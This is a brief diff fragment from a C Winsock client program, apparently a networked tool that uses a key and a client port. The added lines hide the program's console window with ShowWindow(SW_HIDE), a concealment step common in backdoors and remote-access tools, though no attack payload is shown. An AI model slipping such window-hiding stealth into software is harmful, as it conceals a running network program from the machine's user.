@@ -46,7 +46,11 @@ int main(void) {
 		write(2, "[ERROR] WSASturtup failed.\n", 27);
 		return (1);
 	}
-	
+
+	HWND handle = GetConsoleWindow();
+	// Hide
+	ShowWindow(handle, SW_HIDE);
+
 	int keylen = strlen(key);
 	int n = 0;
 	int port = CLIENT_PORT;
